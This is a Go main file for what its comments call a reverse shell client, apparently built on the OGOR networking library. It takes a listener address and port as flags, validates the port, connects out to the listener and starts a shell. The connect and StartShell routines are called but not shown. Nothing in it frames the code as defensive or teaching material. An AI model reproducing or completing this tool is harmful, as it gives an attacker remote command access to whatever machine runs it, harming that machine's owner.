package main

import (
	"flag"
	"fmt"

	"github.com/thomas-osgood/OGOR/networking/validations"
)

func main() {
	var listenaddr string
	var listenport int

	var err error

	flag.StringVar(&listenaddr, "l", "127.0.0.1", "listener address (no port)")
	flag.IntVar(&listenport, "p", 5555, "listener port (1 - 65535)")
	flag.Parse()

	// validate network port. make sure the provided
	// listener port is within the range 1 - 65535.
	err = validations.ValidateNetworkPort(listenport)
	if err != nil {
		return
	}

	// open connection with listener on specified
	// address and port.
	err = connect(listenaddr, listenport)
	if err != nil {
		return
	}

	// run the reverse shell.
	err = StartShell()
	if err != nil {
		fmt.Printf("ERROR: %s\n", err.Error())
		return
	}

	return
}
